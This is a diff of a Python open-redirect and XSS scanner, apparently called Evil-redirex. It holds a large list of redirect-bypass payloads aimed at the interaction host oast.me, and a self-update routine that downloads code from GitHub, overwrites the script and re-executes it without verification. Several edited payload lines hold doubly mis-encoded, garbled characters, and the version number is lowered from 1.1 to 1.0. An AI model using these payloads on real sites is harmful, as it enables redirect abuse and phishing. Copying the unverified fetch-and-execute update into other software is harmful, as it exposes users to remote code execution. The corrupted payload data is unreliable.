@@ -12,11 +12,12 @@ from termcolor import colored, cprint
 from urllib3.exceptions import InsecureRequestWarning, LocationParseError
 import urllib3
 import argparse
-
+from packaging.version import Version
 
 # Constants for update check
 UPDATE_URL = "https://raw.githubusercontent.com/Evil-twinz/Evil-redirex/refs/heads/main/evilredirex.py"  # Update with your actual URL
-CURRENT_VERSION = "1.1"  # Increment this for each new release
+CURRENT_VERSION = "1.0"  # Increment this for each new release
+
 
 # Disable SSL warnings
 urllib3.disable_warnings(InsecureRequestWarning)
@@ -29,7 +30,7 @@ payloads = [
     r'///{{RootURL}}oast.me/%2f%2e%2e', r'//;@oast.me', r'//\/oast.me/', r'//\@oast.me', r'//\oast.me',
     r'//oast.me\toast.me/', r'//https://oast.me//', r'/<>//oast.me', r'/\/\/oast.me/', r'/\/oast.me', r'/\oast.me',
     r'/oast.me', r'/oast.me/%2F..', r'/oast.me/', r'/oast.me/..;/css', r'/https:oast.me', r'/{{RootURL}}oast.me/',
-    r'/Ã£â‚¬Â±oast.me', r'/Ã£â‚¬Âµoast.me', r'/Ã£â€šÂoast.me', r'/Ã£Æ’Â¼oast.me', r'/Ã¯Â½Â°oast.me', r'<>//oast.me', r'@oast.me',
+    r'/ÃƒÂ£Ã¢â€šÂ¬Ã‚Â±oast.me', r'/ÃƒÂ£Ã¢â€šÂ¬Ã‚Âµoast.me', r'/ÃƒÂ£Ã¢â‚¬Å¡Ã‚Âoast.me', r'/ÃƒÂ£Ã†â€™Ã‚Â¼oast.me', r'/ÃƒÂ¯Ã‚Â½Ã‚Â°oast.me', r'<>//oast.me', r'@oast.me',
     r'@https://oast.me', r'\/\/oast.me/', r'oast%E3%80%82me', r'oast.me', r'oast.me/', r'oast.me//', r'oast.me;',
     r'https%3a%2f%2foast.me%2f', r'https:%0a%0doast.me', r'https://%0a%0doast.me', r'https://%09/oast.me',
     r'https://%2f%2f.oast.me/', r'https://%3F.oast.me/', r'https://%5c%5c.oast.me/', r'https://%5coast.me@',
@@ -39,7 +40,7 @@ payloads = [
     r'https://:80#@oast.me/', r'https://:80?@oast.me/', r'https://:@\@oast.me', r'https://:@oast.me\@oast.me',
     r'https://;@oast.me', r'https://\toast.me/', r'https://oast.me/oast.me', r'https://oast.me/https://oast.me/',
     r'https://www.\.oast.me', r'https:/\/\oast.me', r'https:/\oast.me', r'https:/oast.me', r'https:oast.me',
-    r'{{RootURL}}oast.me', r'Ã£â‚¬Â±oast.me', r'Ã£â‚¬Âµoast.me', r'Ã£â€šÂoast.me', r'Ã£Æ’Â¼oast.me', r'Ã¯Â½Â°oast.me', r'redirect/oast.me',
+    r'{{RootURL}}oast.me', r'ÃƒÂ£Ã¢â€šÂ¬Ã‚Â±oast.me', r'ÃƒÂ£Ã¢â€šÂ¬Ã‚Âµoast.me', r'ÃƒÂ£Ã¢â‚¬Å¡Ã‚Âoast.me', r'ÃƒÂ£Ã†â€™Ã‚Â¼oast.me', r'ÃƒÂ¯Ã‚Â½Ã‚Â°oast.me', r'redirect/oast.me',
     r'cgi-bin/redirect.cgi?oast.me', r'out?oast.me', r'login?to=http://oast.me', r'1/_https@oast.me',
     r'redirect?targeturl=https://oast.me',r'https://oast.me/', r'/https://oast.me/', r'//https://oast.me//', r'?targetOrigin=https://oast.me/', r'?fallback=https://oast.me/', r'?query=https://oast.me/', r'?redirection_url=https://oast.me/', r'?next=https://oast.me/', r'?ref_url=https://oast.me/', r'?state=https://oast.me/', r'?1=https://oast.me/', r'?redirect_uri=https://oast.me/', r'?forum_reg=https://oast.me/', r'?return_to=https://oast.me/', r'?redirect_url=https://oast.me/', r'?return_url=https://oast.me/', r'?host=https://oast.me/', r'?url=https://oast.me/', r'?redirectto=https://oast.me/', r'?return=https://oast.me/', r'?prejoin_data=https://oast.me/', r'?callback_url=https://oast.me/', r'?path=https://oast.me/', r'?authorize_callback=https://oast.me/', r'?email=https://oast.me/', r'?origin=https://oast.me/', r'?continue=https://oast.me/', r'?domain_name=https://oast.me/', r'?redir=https://oast.me/', r'?wp_http_referer=https://oast.me/', r'?endpoint=https://oast.me/', r'?shop=https://oast.me/', r'?qpt_question_url=https://oast.me/', r'?checkout_url=https://oast.me/', r'?ref_url=https://oast.me/', r'?redirect_to=https://oast.me/', r'?succUrl=https://oast.me/', r'?file=https://oast.me/', r'?link=https://oast.me/', r'?referrer=https://oast.me/', r'?recipient=https://oast.me/', r'?redirect=https://oast.me/', r'?u=https://oast.me/', r'?hostname=https://oast.me/', r'?returnTo=https://oast.me/', r'?return_path=https://oast.me/', r'?image=https://oast.me/', r'?requestTokenAndRedirect=https://oast.me/', r'?retURL=https://oast.me/', r'?next_url=https://oast.me/', r'/redirect.php?url=https://oast.me/', r'/r/?url=https://oast.me/', r'/login?next=https://oast.me/', r'/checkcookie?redir=https://oast.me/', r'/#/path///https://oast.me/', r'/login?to=https://oast.me/', r'?view=https://oast.me/', r'/out?https://oast.me/', r'/cgi-bin/redirect.cgi?https://oast.me/', r'/redirect/https://oast.me/', r'/redirect?url=https://oast.me/', r'/link?url=https://oast.me/', r'?target=https://oast.me/', r'?rurl=https://oast.me/', r'?dest=https://oast.me/', r'?destination=https://oast.me/', r'?image_url=https://oast.me/', r'?go=https://oast.me/', r'?returnTo=https://oast.me/', r'/success=https://oast.me/', r'/data=https://oast.me/', r'/qurl=https://oast.me/', r'/login=https://oast.me/', r'/logout=https://oast.me/', r'/ext=https://oast.me/', r'/clickurl=https://oast.me/', r'/goto=https://oast.me/'
 ]
@@ -283,32 +284,53 @@ def process_urls(urls):
 
 # Check for updates
 
+def clean_version(version):
+    """Clean the version string to remove unwanted characters like quotes or extra spaces."""
+    return version.strip().replace('"', '').replace("'", "")
+
+
 def check_for_updates():
     """
-    Check if there's a newer version of the script available online.
+    Checks for updates to the script by comparing the current version with the remote version.
+    If a newer version is found, downloads and replaces the script, then restarts it.
     """
     try:
+        print("[+] Checking for updates...")
+
+        # Fetch the remote script
         response = requests.get(UPDATE_URL, timeout=10)
         response.raise_for_status()
         remote_code = response.text
 
+        # Extract the remote version
         remote_version_line = next((line for line in remote_code.splitlines() if "CURRENT_VERSION" in line), None)
-        if remote_version_line is None:
-            print("[!] Version information not found in remote script.")
+        if not remote_version_line:
+            print("[!] Version information not found in the remote script.")
             return
 
-        remote_version = remote_version_line.split('=')[1].strip().strip('"')
+        # Extract the version number using regex
+        match = re.search(r'CURRENT_VERSION\s*=\s*["\']([\d\.]+)["\']', remote_version_line)
+        if not match:
+            print("[!] Could not parse the version from the remote script.")
+            return
 
-        if remote_version > CURRENT_VERSION:
+        remote_version = match.group(1)
+
+        # Compare versions
+        if Version(remote_version) > Version(CURRENT_VERSION):
             print(f"[+] New version available: {remote_version}. Updating now...")
-            with open(__file__, 'w', encoding='utf-8') as current_file:
+
+            # Save the updated script to the same file
+            script_path = os.path.abspath(__file__)
+            with open(script_path, 'w', encoding='utf-8') as current_file:
                 current_file.write(remote_code)
+
             print("[+] Update complete. Restarting...")
 
-            # Restart the script with the correct path
-            script_path = os.path.abspath(__file__)
-            os.execv(sys.executable, [sys.executable, script_path] + sys.argv[1:])  # Restart with full path
-
+            # Add an argument to signal that the update is complete
+            os.execv(sys.executable, [sys.executable, script_path, "--updated"])
+        elif "--updated" in sys.argv:
+            print("[+] Update verification complete. Running the updated script.")
         else:
             print("[+] You are using the latest version.")
 
@@ -318,8 +340,14 @@ def check_for_updates():
         print(f"[!] Unexpected error during update: {e}")
 
 
+
+
 def main():
+    if "--update-complete" in sys.argv:
+        print("[+] Update already completed. Running the updated script.")
+
     check_for_updates()
+
     # Argument parser setup
     parser = argparse.ArgumentParser(description="Test for open redirects and XSS vulnerabilities.")
     parser.add_argument('-u', '--url', type=str, help="Single URL to test")
@@ -334,7 +362,7 @@ def main():
         ||==  \\ // || ||    ||_// ||==  ||  )) || ||_// ||==   )X( 
         ||___  \V/  || ||__| || \\ ||___ ||_//  || || \\ ||___ // \\
         """, "cyan")
-        cprint(r"""                                  @ Srilakivarma Evil-Twinz | v1.1                                         
+        cprint(r"""                                  @ Srilakivarma Evil-Twinz | v1.0                                         
         """, "green", attrs=["blink"])
 
     # Get URL from argument or stdin
@@ -349,7 +377,6 @@ def main():
 
 if __name__ == "__main__":
     try:
-
         main()
     except KeyboardInterrupt:
         print(colored("[!] Program terminated by user.", "red"))
